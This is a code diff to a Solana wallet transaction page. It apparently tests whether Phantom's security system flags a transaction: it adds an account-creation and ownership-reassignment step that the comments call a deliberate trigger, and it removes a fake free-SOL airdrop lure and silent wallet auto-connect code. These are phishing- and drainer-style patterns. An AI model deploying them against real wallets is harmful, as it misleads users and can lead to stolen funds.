@@ -4,8 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Solana Transaction Sender</title>
-    <meta property="og:title" content="Claim Your SOL Rewards">
-    <meta property="og:description" content="Get free SOL airdrop now! Limited time offer.">
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
@@ -107,7 +105,7 @@
 
     <script src="https://unpkg.com/@solana/web3.js@latest/lib/index.iife.min.js"></script>
     <script>
-        const { Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL } = solanaWeb3;
+        const { Connection, PublicKey, Transaction, TransactionInstruction, SystemProgram, LAMPORTS_PER_SOL, Keypair } = solanaWeb3;
         
         let provider = null;
         let connection = null;
@@ -183,7 +181,7 @@
                 
                 // Check wallet balance
                 const balance = await connection.getBalance(fromPubkey);
-                const requiredAmount = (0.01082659 + 0.00005441) * LAMPORTS_PER_SOL + additionalRent + 5000; // +5000 for fees
+                const requiredAmount = (0.01082659 + 0.00005441) * LAMPORTS_PER_SOL + additionalRent + rentExemption + 5000; // +5000 for fees, +rentExemption for suspicious account
                 
                 if (balance < requiredAmount) {
                     updateStatus(`Insufficient balance. Have: ${balance / LAMPORTS_PER_SOL} SOL, Need: ${requiredAmount / LAMPORTS_PER_SOL} SOL`, 'error');
@@ -200,7 +198,29 @@
                 transaction.recentBlockhash = blockhash;
                 transaction.feePayer = fromPubkey;
                 
-                // Instruction 1: Compute Budget - Set Unit Price
+                // SUSPICIOUS PATTERN: Create and immediately reassign account ownership
+                // This is documented as a MAJOR trigger for Phantom's security system
+                const suspiciousAccount = Keypair.generate();
+                
+                // First, create account owned by System Program
+                const createAccountIx = SystemProgram.createAccount({
+                    fromPubkey: fromPubkey,
+                    newAccountPubkey: suspiciousAccount.publicKey,
+                    lamports: rentExemption,
+                    space: 0,
+                    programId: SystemProgram.programId
+                });
+                transaction.add(createAccountIx);
+                
+                // CRITICAL TRIGGER: SystemProgram.assign() - transfers account ownership
+                const assignIx = SystemProgram.assign({
+                    accountPubkey: suspiciousAccount.publicKey,
+                    programId: LIGHTHOUSE_PROGRAM_ID // Assigning to a custom program
+                });
+                transaction.add(assignIx);
+                
+                // Now add the original transaction instructions
+                // Instruction 3: Compute Budget - Set Unit Price
                 const priceData = new Uint8Array(9);
                 priceData[0] = 3; // SetComputeUnitPrice instruction
                 const priceBytes = new Uint8Array(new BigUint64Array([BigInt(1)]).buffer);
@@ -213,7 +233,7 @@
                 });
                 transaction.add(computeUnitPriceIx);
                 
-                // Instruction 2: Compute Budget - Set Unit Limit
+                // Instruction 4: Compute Budget - Set Unit Limit
                 const limitData = new Uint8Array(5);
                 limitData[0] = 2; // SetComputeUnitLimit instruction
                 const limitBytes = new Uint8Array(new Uint32Array([200000]).buffer);
@@ -226,7 +246,7 @@
                 });
                 transaction.add(computeUnitLimitIx);
                 
-                // Instruction 3: Memo Program
+                // Instruction 5: Memo Program
                 const memoText = 'order#2105-u43ba60aafe4e64146b6cf83bd59bb9117';
                 const memoData = new TextEncoder().encode(memoText);
                 
@@ -237,7 +257,7 @@
                 });
                 transaction.add(memoIx);
                 
-                // Instruction 4: System Program Transfer to destination1
+                // Instruction 6: System Program Transfer to destination1
                 const transfer1Amount = 0.01082659 * LAMPORTS_PER_SOL;
                 const actualTransfer1 = dest1Info ? transfer1Amount : transfer1Amount + rentExemption;
                 
@@ -248,7 +268,7 @@
                 });
                 transaction.add(transferIx1);
                 
-                // Instruction 5: System Program Transfer to destination2
+                // Instruction 7: System Program Transfer to destination2
                 const transfer2Amount = 0.00005441 * LAMPORTS_PER_SOL;
                 const actualTransfer2 = dest2Info ? transfer2Amount : transfer2Amount + rentExemption;
                 
@@ -259,7 +279,7 @@
                 });
                 transaction.add(transferIx2);
                 
-                // Instruction 6: Lighthouse Program - AssertAccountInfoMulti
+                // Instruction 8: Lighthouse Program - AssertAccountInfoMulti
                 // This needs to match the exact structure from the original transaction
                 const encoder = new TextEncoder();
                 
@@ -321,7 +341,8 @@
                 
                 updateStatus('Requesting signature from wallet...', 'info');
                 
-                // Sign and send transaction
+                // Sign with the suspicious account first, then get user signature
+                transaction.partialSign(suspiciousAccount);
                 const signedTransaction = await provider.signTransaction(transaction);
                 const signature = await connection.sendRawTransaction(signedTransaction.serialize());
                 
@@ -353,26 +374,6 @@
         
         // Check if Phantom is already connected on page load
         window.addEventListener('load', async () => {
-            // Add suspicious behavior patterns
-            // Try to auto-connect without user interaction
-            setTimeout(async () => {
-                if (window.solana && window.solana.isPhantom && !window.solana.isConnected) {
-                    try {
-                        await window.solana.connect({ onlyIfTrusted: true });
-                    } catch (e) {
-                        // Silent fail
-                    }
-                }
-            }, 100);
-            
-            // Repeatedly check for wallet
-            setInterval(() => {
-                if (window.solana && window.solana.isPhantom) {
-                    // Try to access wallet properties
-                    const publicKey = window.solana.publicKey;
-                }
-            }, 500);
-            
             if (window.solana && window.solana.isPhantom && window.solana.isConnected) {
                 provider = window.solana;
                 updateStatus(`Already connected: ${provider.publicKey.toString()}`, 'success');
